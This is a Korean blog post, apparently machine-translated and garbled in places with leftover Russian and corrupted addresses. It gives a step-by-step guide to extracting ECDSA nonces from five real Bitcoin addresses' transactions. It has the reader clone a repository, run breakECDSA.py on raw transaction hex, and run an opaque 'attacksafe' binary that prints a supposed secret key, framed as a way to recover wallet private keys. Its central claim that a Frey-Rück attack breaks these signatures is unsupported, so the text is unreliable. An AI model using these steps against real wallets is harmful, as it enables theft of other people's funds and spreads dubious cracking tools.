# 비밀 키 K (NONCE)를 얻기 위해 Frey-Ruck 공격을 구현합니다.

<!-- wp:embed {"url":"https://www.youtube.com/embed/wqHES7r1qyc","type":"rich","providerNameSlug":"вставить-обработчик","responsive":true,"className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed is-type-rich is-provider-вставить-обработчик wp-block-embed-вставить-обработчик wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/embed/wqHES7r1qyc
</div></figure>
<!-- /wp:embed -->

<!-- wp:paragraph -->
<p>이 기사에서는 비트코인 ​​블록체인에서 트랜잭션&nbsp;서명을 위한 효율적인&nbsp;<a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">Frey-Rück 공격</a>&nbsp;알고리즘을 구현합니다 .&nbsp;<code>ECDSA</code>이전 게시물에서 우리는 서명 취약성 주제를 여러 번 다루었습니다&nbsp;<code>ECDSA</code>.&nbsp;비트코인 블록체인 트랜잭션의 치명적인 취약점으로 우리는 비트코인 ​​지갑을 궁극적으로 복원하기 위해 취약한 서명에서&nbsp;<code>ECDSA</code>&nbsp;<em>비밀 키를</em>&nbsp;추출하는 다소 어려운 이산 로그 문제를 해결할 수 있습니다. 비밀 키를 알면 개인 키를 얻을 수 있기 때문입니다.<code>"K" (NONCE)</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이를 위해&nbsp;<a href="https://attacksafe.ru/list-of-bitcoin-attacks/" target="_blank" rel="noreferrer noopener"><strong>비트코인에 대한 인기 있는 공격 목록</strong></a>&nbsp;에 여러 알고리즘이 있으며 그 중 하나는&nbsp;<strong><a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener">"비트코인에 대한 프레이-뤼크 공격"</a></strong>&nbsp;입니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":613,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/001-1.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-613" title="www.attacksafe.ru/frey-ruck-attack-on-bitcoin/"/></a><figcaption class="wp-element-caption"><br><strong><code>www.attacksafe.ru/frey-ruck-attack-on-bitcoin</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":4} -->
<h4>우리는 이 공격의 이론적인 측면에 뛰어들지 않고 실험적인 부분으로 곧장 갈 것입니다.</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>실습을 통해 우리는 비트코인 ​​블록체인에 취약하고 취약한 트랜잭션이 많다는 것을 알고 있으며, 암호화 분석 과정에서 많은 비트코인 ​​주소를 발견&nbsp;<code>ECDSA</code>했습니다&nbsp;<em>. 비밀 키</em>&nbsp;<code>"K" (NONCE).</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>5개의 비트코인 ​​주소를 고려하십시오.</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12시2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWafbh925cr7L4Q8ac</a></strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>각 비트코인 ​​주소는 두 개의 중요하고 취약한 트랜잭션을 생성했습니다.</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/81384edbf408aa501814582663386ae25819c7b14c89d69e36250059f2399128
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":644} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-1.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-644"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":645} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-2.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-645"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener">1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/fed0b3472341788b58798d6a124a4d0c66c86535ae5f640cb7e5ba0e175665fb
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/e5bb4aba7dc061059ac163e2dd62b4b025454f5db85e4ec65f45edee97d91393
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":649} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-3.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-649"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":651} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-4.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-651"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":661} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-5.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-661"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":663} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-6.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-663"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12시2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":667} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-7.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-667"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":668} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-8.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-668"/></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/19BRiDqZfYxU4K3DCWAfbh925cr7L4Q8ac" target="_blank" rel="noreferrer noopener">19BRiDqZfYxU4K3DCWafbh925cr7L4Q8ac</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/492955688cff583fa5b6677bcb9a90a3010925f7e2204fd464e0e7183a6954db
</div></figure>
<!-- /wp:embed -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/e3dfc0d3b61972d04446214481d8e54623e5e0f2aaf26d7bc01fe5081249b4ea
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":673} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-9.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-673"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":675} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-10.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-675"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>비트코인 블록체인의 비밀 키 "K"(NONCE) 공개</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/TerminalGoogleColab" target="_blank" rel="noreferrer noopener">[TerminalGoogleColab]을</a></strong>&nbsp;엽니다&nbsp;&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/CryptoDeepTools/tree/main/14FreyRuckAttack" target="_blank" rel="noreferrer noopener"><strong>14FreyRuckAttack</strong></a>&nbsp;리포지토리 로&nbsp;효율적인&nbsp;<a href="https://attacksafe.ru/frey-ruck-attack-on-bitcoin/" target="_blank" rel="noreferrer noopener"><strong>Frey-Rück 공격 알고리즘 구현</strong></a><a href="https://github.com/demining/CryptoDeepTools/tree/main/14FreyRuckAttack" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>git clone https://github.com/demining/CryptoDeepTools.git

cd CryptoDeepTools/14FreyRuckAttack/

ls</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":926} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-28-1024x500.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-926"/></figure>
<!-- /wp:image -->

<!-- wp:heading {"level":3} -->
<h3>필요한 모든 패키지를 설치하십시오.</h3>
<!-- /wp:heading -->

<!-- wp:image {"id":687} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-11.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-687"/><figcaption class="wp-element-caption"><strong><code>requirements.txt</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>sudo apt install python2-minimal

wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

sudo python2 get-pip.py

pip2 install -r requirements.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":930} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-29-1024x560.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-930"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":931} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-30.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-931"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":933} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-31-1024x441.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-933"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":935} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-32-1024x430.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-935"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2>공격을 위한 RawTX 준비</h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2></h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong><a href="https://btc1.trezor.io/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG" target="_blank" rel="noreferrer noopener">16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:embed {"url":"https://btc1.trezor.io/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72"} -->
<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
https://btc1.trezor.io/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72
</div></figure>
<!-- /wp:embed --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":696} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-13-1024x80.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-696"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>RawTX = 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000
</code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2>이제 모든 취약한 트랜잭션에서 모든 R, S, Z 값을 가져와야 합니다.</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>breakECDSA.py 스크립트를 사용해봅시다.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":937} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-33-1024x263.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-937"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>R = 0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
S = 0x649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1
Z = 0xb8e936d143c8733bb1ede19146f8725fee1d10bfc19e14452a51cef0cb0014d8</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong></strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener">공격을 구현하고 비밀 키를 얻기 위해 "ATTACKSAFE SOFTWARE"</a></strong><strong>&nbsp;소프트웨어를 사용합니다.</strong><strong><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"></a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":705,"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://attacksafe.ru/software/" target="_blank" rel="noreferrer noopener"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-14.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-705"/></a><figcaption class="wp-element-caption"><strong><code>www.attacksafe.ru/software</code></strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>액세스 권한:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>chmod +x attacksafe</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":940} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-34.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-940"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>애플리케이션:</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -help</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":943} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-35.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-943"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>  -version:  software version 
  -list:     list of bitcoin attacks
  -tool:     indicate the attack
  -gpu:      enable gpu
  -time:     work timeout
  -server:   server mode
  -port:     server port
  -open:     open file
  -save:     save file
  -search:   vulnerability search
  -stop:     stop at mode
  -max:      maximum quantity in mode
  -min:      minimum quantity per mode
  -speed:    boost speed for mode
  -range:    specific range
  -crack:    crack mode
  -field:    starting field
  -point:    starting point
  -inject:   injection regimen
  -decode:   decoding mode</code></pre>
<!-- /wp:code -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -version</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":948} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-37.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-948"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code>"ATTACKSAFE SOFTWARE"</code>Bitcoin에 대한 모든 대중적인 공격을 포함합니다.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>모든 공격 목록을 실행해 보겠습니다.</h2>
<!-- /wp:heading -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -list</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":951} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-38-1024x602.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-951"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":954} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-39-1024x602.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-954"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>그런 다음 선택<code>&nbsp;-tool: frey_ruck_attack</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>취약한 ECDSA 서명 트랜잭션에서 비밀 키를 얻기 위해 데이터를&nbsp;<code>RawTX</code>텍스트 문서에 추가하고 파일로 저장해 봅시다.<code>RawTX.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><code>-tool frey_ruck_attack</code>소프트웨어를 사용하여&nbsp;실행<code>“ATTACKSAFE SOFTWARE”</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:code -->
<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":963} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-42-1024x261.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-963"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>우리는 이 공격을 시작했고&nbsp;<code>-tool frey_ruck_attack</code>그 결과는 파일에 저장되었습니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>이제 성공적인 결과를 보려면 파일을 엽니다.<code>SecretKey.txt</code></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":965} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-43-1024x487.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-965"/></figure>
<!-- /wp:image -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3

RawTX = 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><code>"Deployments ECDSA"</code>우리는 비트코인 ​​블록체인 트랜잭션의 치명적인 취약점을 의미하는&nbsp;비문을 봅니다 .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>SecretKey значение в формате HEX, это и есть наш секретный ключ "K" (NONCE):</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><code>K = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3</code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2><em>파이썬</em>&nbsp;스크립트&nbsp;로 확인하자<code>point2gen.py</code></h2>
<!-- /wp:heading -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>이렇게 하려면 ECPy</strong></a>&nbsp;타원 곡선 라이브러리를 설치합니다&nbsp;.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>pip3 install ECPy</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":968} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2022/10/image-44-1024x335.png" alt="비밀 키 &quot;K&quot;(NONCE)를 얻기 위해 Frey-Rück 공격을 구현합니다." class="wp-image-968"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>이제 다음을 지정하여 스크립트를 실행해 보겠습니다&nbsp;<code>секретный ключ "K" (NONCE)</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>python3 point2gen.py 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3</code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":971} -->
